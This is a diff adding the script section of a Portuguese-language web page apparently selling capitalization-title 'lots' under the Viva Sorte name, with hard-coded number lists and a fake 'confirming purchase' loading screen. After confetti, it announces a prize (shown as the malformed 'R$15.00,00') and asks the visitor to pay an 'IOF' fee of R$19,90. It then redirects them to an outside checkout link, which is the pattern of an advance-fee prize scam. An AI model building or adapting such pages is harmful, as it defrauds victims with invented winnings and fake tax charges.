+                    jogosOcultos: [
+                        ['01', '06', '13', '20', '27', '30', '36', '42', '48', '57', '64', '70', '78'],
+                        ['03', '07', '12', '18', '23', '29', '34', '39', '45', '52', '61', '66', '72'],
+                        ['04', '09', '17', '24', '31', '38', '44', '51', '60', '65', '71', '76', '80'],
+                        ['06', '14', '19', '26', '32', '41', '47', '54', '62', '67', '73', '74', '79'],
+                        ['01', '08', '12', '20', '29', '34', '39', '46', '52', '60', '66', '72', '78'],
+                        ['03', '11', '16', '23', '27', '30', '36', '42', '49', '55', '64', '70', '75'],
+                        ['02', '07', '13', '19', '25', '33', '40', '45', '53', '58', '63', '69', '77'],
+                        ['05', '10', '15', '22', '28', '35', '38', '43', '50', '61', '65', '71', '76'],
+                        ['02', '07', '11', '16', '23', '30', '36', '42', '49', '55', '63', '70', '79'],
+                        ['01', '06', '12', '20', '26', '31', '39', '45', '52', '60', '66', '74', '80'],
+                        ['04', '09', '14', '18', '25', '33', '37', '44', '51', '57', '68', '73', '77'],
+                        ['03', '08', '13', '19', '24', '28', '34', '41', '48', '56', '62', '69', '75'],
+                        ['05', '10', '15', '22', '27', '32', '38', '43', '50', '58', '64', '71', '76'],
+                        ['06', '11', '17', '21', '29', '35', '40', '47', '54', '59', '65', '72', '78'],
+                        ['01', '08', '14', '20', '26', '30', '36', '45', '53', '60', '67', '74', '79'],
+                        ['02', '09', '13', '19', '23', '33', '37', '42', '51', '61', '68', '70', '80'],
+                        ['04', '07', '12', '18', '25', '31', '39', '44', '49', '55', '63', '73', '77'],
+                        ['03', '05', '16', '22', '27', '34', '38', '41', '46', '52', '66', '69', '75']
+                    ]
+                },
+                '3': {
+                    composicao: '30 títulos com 15 números',
+                    jogosVisiveis: [
+                        ['02', '07', '13', '18', '21', '25', '30', '34', '40', '45', '53', '60', '66', '72', '78'],
+                        ['01', '06', '12', '19', '23', '27', '31', '36', '41', '46', '50', '59', '64', '69', '75']
+                    ],
+                    jogosOcultos: [
+                        ['03', '08', '14', '20', '26', '29', '33', '39', '44', '48', '52', '57', '61', '68', '77'],
+                        ['05', '10', '15', '22', '28', '32', '38', '43', '47', '51', '56', '62', '67', '74', '80'],
+                        ['04', '09', '11', '16', '24', '35', '37', '42', '49', '55', '58', '63', '70', '73', '76'],
+                        ['01', '07', '13', '18', '25', '30', '34', '40', '45', '50', '54', '60', '66', '71', '79'],
+                        ['02', '06', '11', '17', '22', '27', '31', '36', '41', '46', '53', '59', '65', '72', '78'],
+                        ['03', '08', '12', '20', '26', '33', '39', '44', '48', '52', '57', '61', '69', '75', '77'],
+                        ['05', '10', '14', '19', '23', '28', '32', '38', '43', '47', '51', '56', '62', '67', '74'],
+                        ['04', '09', '15', '16', '21', '24', '35', '37', '42', '49', '55', '58', '63', '70', '80'],
+                        ['01', '05', '07', '10', '12', '34', '41', '42', '50', '57', '61', '63', '76', '77', '78'],
+                        ['07', '17', '19', '23', '24', '34', '40', '50', '51', '56', '58', '63', '73', '74', '79'],
+                        ['10', '17', '19', '25', '28', '41', '43', '46', '47', '64', '66', '67', '73', '78', '80'],
+                        ['04', '07', '21', '31', '33', '34', '35', '36', '38', '60', '68', '73', '75', '77', '78'],
+                        ['05', '08', '14', '28', '31', '32', '37', '40', '49', '53', '59', '62', '66', '69', '72'],
+                        ['01', '15', '23', '30', '35', '37', '40', '43', '46', '51', '54', '63', '64', '74', '78'],
+                        ['01', '09', '17', '20', '21', '36', '40', '53', '57', '64', '67', '69', '73', '79', '80'],
+                        ['02', '04', '12', '17', '19', '30', '34', '44', '48', '50', '51', '57', '59', '68', '79'],
+                        ['05', '07', '11', '14', '19', '24', '29', '35', '41', '43', '44', '64', '68', '76', '78'],
+                        ['02', '05', '09', '12', '19', '30', '32', '34', '40', '43', '47', '50', '54', '69', '80'],
+                        ['02', '06', '07', '19', '20', '29', '43', '48', '51', '57', '61', '64', '68', '71', '73'],
+                        ['01', '15', '22', '26', '35', '36', '41', '48', '49', '52', '70', '72', '74', '79', '80'],
+                        ['01', '05', '06', '17', '24', '29', '37', '43', '48', '57', '58', '61', '68', '73', '80'],
+                        ['01', '08', '14', '19', '22', '29', '34', '38', '45', '46', '51', '56', '62', '76', '79'],
+                        ['03', '23', '24', '25', '27', '28', '34', '36', '37', '50', '53', '58', '59', '63', '78'],
+                        ['08', '11', '23', '24', '26', '33', '37', '39', '40', '47', '51', '58', '65', '72', '73'],
+                        ['08', '09', '10', '11', '14', '18', '22', '24', '28', '29', '64', '67', '69', '70', '79'],
+                        ['08', '13', '14', '17', '23', '25', '27', '35', '41', '54', '57', '61', '72', '74', '75'],
+                        ['04', '09', '11', '18', '19', '24', '40', '50', '52', '53', '55', '59', '66', '69', '77'],
+                        ['04', '07', '08', '14', '18', '20', '27', '32', '33', '50', '54', '61', '62', '74', '76']
+                    ]
+                },
+                '4': {
+                    composicao: '40 títulos com 12 números',
+                    jogosVisiveis: [
+                        ['04', '09', '15', '22', '28', '33', '40', '46', '53', '60', '68', '74'],
+                        ['01', '07', '14', '20', '25', '31', '37', '42', '49', '55', '63', '78']
+                    ],
+                    jogosOcultos: [
+                        ['03', '08', '12', '18', '27', '34', '39', '45', '52', '59', '66', '73'],
+                        ['06', '11', '16', '24', '30', '36', '44', '50', '57', '61', '67', '75'],
+                        ['02', '10', '17', '23', '32', '38', '43', '48', '56', '62', '70', '80'],
+                        ['05', '13', '19', '26', '35', '41', '47', '51', '54', '64', '72', '79'],
+                        ['01', '09', '15', '22', '29', '33', '40', '46', '58', '60', '69', '76'],
+                        ['02', '08', '14', '20', '26', '31', '37', '42', '50', '55', '63', '77'],
+                        ['04', '07', '13', '18', '28', '34', '39', '45', '52', '59', '65', '73'],
+                        ['03', '06', '12', '17', '24', '30', '38', '44', '49', '61', '67', '74'],
+                        ['01', '11', '16', '23', '29', '35', '41', '47', '54', '58', '66', '72'],
+                        ['05', '09', '18', '26', '32', '39', '43', '51', '57', '64', '71', '79'],
+                        ['02', '08', '15', '21', '28', '34', '40', '46', '53', '59', '65', '77'],
+                        ['04', '10', '19', '25', '31', '37', '42', '48', '56', '62', '69', '76'],
+                        ['07', '13', '20', '27', '33', '36', '45', '52', '60', '68', '73', '80'],
+                        ['03', '11', '17', '24', '30', '38', '44', '50', '58', '63', '70', '78'],
+                        ['01', '09', '16', '22', '29', '35', '41', '47', '55', '61', '67', '75'],
+                        ['06', '12', '18', '25', '32', '39', '43', '49', '56', '64', '71', '77'],
+                        ['04', '08', '15', '23', '28', '34', '40', '46', '53', '59', '66', '72'],
+                        ['02', '10', '19', '26', '31', '37', '42', '48', '54', '62', '69', '76'],
+                        ['05', '13', '20', '27', '33', '36', '45', '51', '57', '65', '73', '79'],
+                        ['07', '11', '17', '24', '30', '38', '44', '50', '58', '63', '70', '80'],
+                        ['01', '09', '16', '22', '29', '35', '41', '47', '55', '61', '68', '74'],
+                        ['03', '12', '18', '25', '32', '39', '43', '49', '56', '64', '71', '77'],
+                        ['06', '08', '15', '23', '28', '34', '40', '46', '53', '59', '66', '78'],
+                        ['04', '10', '19', '26', '31', '37', '42', '48', '54', '62', '69', '75'],
+                        ['02', '13', '20', '27', '33', '36', '45', '51', '57', '65', '72', '79'],
+                        ['05', '11', '17', '24', '30', '38', '44', '50', '58', '63', '70', '80'],
+                        ['07', '09', '16', '22', '29', '35', '41', '47', '55', '61', '68', '76'],
+                        ['01', '12', '18', '25', '32', '39', '43', '49', '56', '64', '71', '73'],
+                        ['03', '08', '15', '23', '28', '34', '40', '46', '53', '59', '66', '77'],
+                        ['06', '10', '19', '26', '31', '37', '42', '48', '54', '62', '69', '78'],
+                        ['04', '13', '20', '27', '33', '36', '45', '51', '57', '65', '72', '75'],
+                        ['02', '11', '17', '24', '30', '38', '44', '50', '58', '63', '70', '79'],
+                        ['05', '09', '16', '22', '29', '35', '41', '47', '55', '61', '68', '74'],
+                        ['07', '12', '18', '25', '32', '39', '43', '49', '56', '64', '71', '80'],
+                        ['01', '08', '15', '23', '28', '34', '40', '46', '53', '59', '66', '76'],
+                        ['03', '10', '19', '26', '31', '37', '42', '48', '54', '62', '69', '73'],
+                        ['06', '13', '20', '27', '33', '36', '45', '51', '57', '65', '72', '77'],
+                        ['04', '11', '17', '24', '30', '38', '44', '50', '58', '63', '70', '78'],
+                        ['02', '09', '16', '22', '29', '35', '41', '47', '55', '61', '68', '75']
+                    ]
+                }
+            };
+
+            const titulo = titulos[bolaoId];
+            if (!titulo) return;
+
+            // Atualizar composição
+            document.getElementById('composicaoBolao').innerHTML = `Composição: <b>${titulo.composicao}</b>`;
+
+            // Limpar container das dezenas
+            const container = document.getElementById('dezenasBolaoContainer');
+            container.innerHTML = '';
+
+            // Adicionar títulos visíveis
+            titulo.jogosVisiveis.forEach((jogo, index) => {
+                const dezenaDiv = document.createElement('div');
+                dezenaDiv.className = 'dezenas-bolao';
+                if (index > 0) dezenaDiv.style.marginTop = '10px';
+                
+                jogo.forEach(numero => {
+                    const span = document.createElement('span');
+                    span.textContent = numero;
+                    dezenaDiv.appendChild(span);
+                });
+                
+                container.appendChild(dezenaDiv);
+            });
+
+            // Se há títulos ocultos, configurar botão "Ver Mais"
+            if (titulo.jogosOcultos && titulo.jogosOcultos.length > 0) {
+                document.getElementById('verMaisBolaoBtn').style.display = 'inline-block';
+                
+                // Limpar container dos títulos ocultos
+                const maisJogosContainer = document.getElementById('maisJogosBolao');
+                maisJogosContainer.innerHTML = '';
+                
+                // Adicionar títulos ocultos
+                titulo.jogosOcultos.forEach(jogo => {
+                    const dezenaDiv = document.createElement('div');
+                    dezenaDiv.className = 'dezenas-bolao';
+                    dezenaDiv.style.marginTop = '10px';
+                    
+                    jogo.forEach(numero => {
+                        const span = document.createElement('span');
+                        span.textContent = numero;
+                        dezenaDiv.appendChild(span);
+                    });
+                    
+                    maisJogosContainer.appendChild(dezenaDiv);
+                });
+            }
+        }
+
+        // Função para carregar dados do lote baseado no ID (vindos da página principal)
+        function carregarDadosLote(loteId) {
+            const lotes = {
+                '1': {
+                    quantidade: 20,
+                    valor: '',
+                    composicao: '20 títulos de capitalização',
+                    numerosVisiveis: ['03245', '08674', '17280', '22586', '29266'],
+                    numerosOcultos: [
+  '58392', '19476', '70153', '82649', '31947',
+  '10734', '45820', '67215', '93281', '24017',
+  '61539', '78104', '35621', '49872', '12905'
+]
+                },
+                '2': {
+                    quantidade: 30,
+                    valor: '',
+                    composicao: '30 títulos de capitalização',
+                    numerosVisiveis: ['03345', '12226', '18566', '24232', '31467'],
+                    numerosOcultos: [
+  '73928', '18475', '52013', '86794', '30125',
+  '47609', '65213', '98420', '13579', '24860',
+  '71346', '59281', '46723', '83015', '26947',
+  '57419', '68102', '93048', '12765', '35489',
+  '80624', '41357', '69502', '72819', '15903'
+]
+                },
+                '3': {
+                    quantidade: 40,
+                    valor: '',
+                    composicao: '40 títulos de capitalização',
+                    numerosVisiveis: ['07335', '14119', '21222', '28333', '35444'],
+                    numerosOcultos: [
+  '04223', '11334', '18445', '25556', '32667', '39778', '42889', '46990', '49001', '53112',
+  '56223', '60334', '63445', '67556', '70667', '77778', '01889', '07990', '10001', '14112',
+  '20223', '23334', '28445', '30556', '35667', '36778', '44889', '50990', '58001', '65112',
+  '68223', '72334', '75445', '80556', '08667'
+]
+                },
+                '4': {
+                    quantidade: 70,
+                    valor: '',
+                    composicao: '70 títulos de capitalização',
+                    numerosVisiveis: ['09335', '16119', '23222', '30333', '37444'],
+                    numerosOcultos: [
+  '06223', '13334', '20445', '27556', '34667', '41778', '44889', '48990', '51001', '55112',
+  '58223', '62334', '65445', '69556', '72667', '79778', '01889', '03990', '05001', '07112',
+  '10223', '14334', '15445', '16556', '17667', '18778', '19889', '21990', '22001', '23112',
+  '24223', '25334', '26445', '28556', '29667', '30778', '31889', '32990', '33001', '35112',
+  '31889', '32990', '33001', '35112', '36223', '37334', '38445', '39556', '40667', '42778',
+  '43889', '45990', '46001', '47112', '49223', '50334', '52445', '53556', '54667', '56778',
+  '57889', '59990', '60001', '63112', '66223', '67334', '70445', '74556'
+]
+                },
+                '5': {
+                    quantidade: 100,
+                    valor: '',
+                    composicao: '100 títulos de capitalização',
+                    numerosVisiveis: ['11', '18', '25', '32', '39'],
+                    numerosOcultos: [
+  '46', '53', '60', '67', '74', '01', '08', '15', '22', '29', '36', '43', '50', '57', '64', '71',
+  '02', '77', '12', '37', '18', '04', '09', '32', '14', '06', '27', '70', '35', '11', '63', '30',
+  '78', '66', '03', '41', '21', '25', '19', '59', '48', '26', '16', '55', '20', '24', '76', '07',
+  '28', '73', '42', '17', '75', '05', '58', '80', '13', '44', '33', '38', '39', '31', '23', '10',
+  '34', '40', '45', '62', '56', '49', '61', '47', '72', '52', '68', '69', '79', '54', '65', '51',
+  '06', '60', '14', '43', '36', '02', '12', '25', '38', '76', '28', '05', '66', '39', '17'
+]
+                },
+                '6': {
+                    quantidade: 200,
+                    valor: '',
+                    composicao: '200 títulos de capitalização',
+                    numerosVisiveis: ['13335', '20119', '27222', '34333', '41444'],
+                    numerosOcultos: [
+  '46334', '53445', '60556', '67667', '74778', '01889', '08990', '15001', '22112', '29223', '36334', '43445', '50556', '57667', '64778', '71889',
+  '02990', '77001', '12112', '37223', '18334', '04445', '09556', '32667', '14778', '06889', '27990', '70001', '35112', '11223', '63334', '30445',
+  '78556', '66667', '03778', '41889', '21990', '25001', '19112', '59223', '48334', '26445', '16556', '55667', '20667', '24778', '76889', '07990',
+  '28001', '73112', '42223', '17334', '75445', '05556', '58667', '80778', '13889', '44990', '33001', '38112', '39223', '31334', '23445', '10556',
+  '34224', '40335', '45446', '62557', '56668', '49779', '61880', '47991', '72002', '52113', '68224', '69335', '79446', '54557', '65668', '51779',
+  '06880', '60991', '14002', '43113', '36224', '02335', '12446', '25557', '38668', '76779', '28880', '05991', '66002', '39113', '17224'
+]
+                }
+            };
+
+            const lote = lotes[loteId];
+            if (!lote) return;
+
+            // Atualizar valor do lote
+            document.querySelector('.container-principal-bolao h1').textContent = lote.valor;
+            
+            // Atualizar descrição
+            document.querySelector('.container-principal-bolao h2').textContent = `Lote de ${lote.quantidade} Títulos`;
+            
+            // Atualizar composição
+            document.getElementById('composicaoBolao').innerHTML = `Composição: <b>${lote.composicao}</b>`;
+
+            // Limpar container das dezenas
+            const container = document.getElementById('dezenasBolaoContainer');
+            container.innerHTML = '';
+
+            // Adicionar números visíveis do lote
+            const dezenaDiv = document.createElement('div');
+            dezenaDiv.className = 'dezenas-bolao';
+            
+            lote.numerosVisiveis.forEach(numero => {
+                const span = document.createElement('span');
+                span.textContent = numero;
+                dezenaDiv.appendChild(span);
+            });
+            
+            container.appendChild(dezenaDiv);
+
+            // Configurar números ocultos se existirem
+            if (lote.numerosOcultos && lote.numerosOcultos.length > 0) {
+                document.getElementById('verMaisBolaoBtn').style.display = 'inline-block';
+                
+                // Limpar container dos números ocultos
+                const maisJogosContainer = document.getElementById('maisJogosBolao');
+                maisJogosContainer.innerHTML = '';
+                
+                // Adicionar números ocultos (15 números divididos em grupos de 5)
+                const gruposNumeros = [];
+                for (let i = 0; i < lote.numerosOcultos.length; i += 5) {
+                    gruposNumeros.push(lote.numerosOcultos.slice(i, i + 5));
+                }
+                
+                gruposNumeros.forEach(grupo => {
+                    const dezenaOcultaDiv = document.createElement('div');
+                    dezenaOcultaDiv.className = 'dezenas-bolao';
+                    dezenaOcultaDiv.style.marginTop = '10px';
+                    
+                    grupo.forEach(numero => {
+                        const span = document.createElement('span');
+                        span.textContent = numero;
+                        dezenaOcultaDiv.appendChild(span);
+                    });
+                    
+                    maisJogosContainer.appendChild(dezenaOcultaDiv);
+                });
+            } else {
+                document.getElementById('verMaisBolaoBtn').style.display = 'none';
+            }
+            
+            // Atualizar texto do título da confirmação
+            document.querySelector('#confirmacaoBolao h1').textContent = `Confirme seu lote de ${lote.quantidade} títulos:`;
+            
+            // Atualizar texto do botão
+            document.querySelector('.botoes-bolao button').innerHTML = `<i class="bi bi-check-circle-fill"></i> CONFIRMAR COMPRA DE ${lote.quantidade} TÍTULOS`;
+        }
+
+        // Função para toggle dos títulos
+        function toggleJogosBolao() {
+            const maisJogos = document.getElementById('maisJogosBolao');
+            const verMaisBtn = document.getElementById('verMaisBolaoBtn');
+
+            if (maisJogos.style.display === 'none') {
+                maisJogos.style.display = 'block';
+                verMaisBtn.textContent = 'Ver Menos';
+            } else {
+                maisJogos.style.display = 'none';
+                verMaisBtn.textContent = 'Ver Mais';
+            }
+        }
+
+        // Função para confirmar o título/lote e mostrar tela do upsell
+        function confirmarBolao() {
+            const confirmacaoBolao = document.getElementById('confirmacaoBolao');
+            const telaUpsellOriginal = document.getElementById('telaUpsellOriginal');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const loadingTitle = loadingScreen.querySelector('.loading-title');
+            const loadingMessage = loadingScreen.querySelector('.loading-message');
+            
+            // Verificar se é um lote da página principal ou título do upsell
+            const urlParams = new URLSearchParams(window.location.search);
+            const loteId = urlParams.get('lote_id');
+            const isLote = loteId !== null;
+            
+            // Esconder tela de confirmação
+            confirmacaoBolao.style.display = 'none';
+            
+            // Alterar textos do loading baseado no tipo
+            if (isLote) {
+                loadingTitle.textContent = 'Confirmando sua compra';
+            loadingMessage.textContent = 'Estamos processando sua confirmação...';
+            } else {
+                loadingTitle.textContent = 'Confirmando seu título';
+                loadingMessage.textContent = 'Estamos processando sua confirmação...';
+            }
+            
+            // Mostrar tela de loading novamente
+            loadingScreen.style.display = 'flex';
+            loadingScreen.classList.remove('hidden');
+            
+            // Após 4 segundos, esconder loading e mostrar tela do upsell
+            setTimeout(function() {
+                loadingScreen.classList.add('hidden');
+                
+                // Após animação de saída (0.5s), mostrar tela do upsell
+                setTimeout(function() {
+                    // Restaurar textos originais do loading
+                    loadingTitle.textContent = 'Carregando seu título';
+                    loadingMessage.textContent = 'Estamos preparando suas informações...';
+                    
+                    // Ajustar valor do prêmio baseado no tipo
+                    if (isLote) {
+                        // Para lotes da página principal, valor menor
+                        const valorPremio = document.querySelector('.valor-premio');
+                        const descricaoPremio = document.querySelector('.valor-descricao');
+                        
+                        valorPremio.textContent = 'R$15.00,00';
+                        descricaoPremio.textContent = 'Prêmio do Viva Sorte - Lote de Títulos';
+                        
+                        // Ajustar valor do IOF
+                        const valorIOF = document.querySelector('.btn-pagamento');
+                        valorIOF.innerHTML = '<i class="bi bi-credit-card"></i> RECOLHER IOF - R$ 19,90';
+                        valorIOF.setAttribute('onclick', 'processarPagamento(1990)');
+                        
+                        // Ajustar texto do IOF na lista
+                        const listaIOF = document.querySelector('.info-lista li:nth-child(3)');
+                        if (listaIOF) {
+                            listaIOF.innerHTML = 'Valor do IOF a recolher: <strong>R$ 19,90</strong>';
+                        }
+                    }
+                    
+                    // Restaurar scroll e mostrar tela original do upsell
+                    document.body.style.overflow = 'auto';
+                    telaUpsellOriginal.style.display = 'block';
+                    
+                    // Iniciar confetes
+                    setTimeout(function() {
+                        iniciarConfetes();
+                    }, 500);
+                }, 500);
+            }, 4000);
+        }
+
+        // Função para redirecionar diretamente para a página de pagamento
+        function processarPagamento(valor) {
+            // URL de destino
+            const baseUrl = 'https://www.pagamentos-seguro.link/checkout/67480e3b-8be2-48d0-b7b8-a850a7c119e1';
+
+            // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
+            const currentParams = new URLSearchParams(window.location.search).toString();
+
+            // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
+            let redirectUrl = baseUrl;
+            if (currentParams) {
+                // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
+                if (baseUrl.includes('?')) {
+                    redirectUrl += '&' + currentParams;
+                } else {
+                    redirectUrl += '?' + currentParams;
+                }
+            }
+            
+            // Redireciona o navegador do usuário para o link final instantaneamente
+            window.location.href = redirectUrl;
+        }
+
+    </script>
+ 
+
+</body></html>
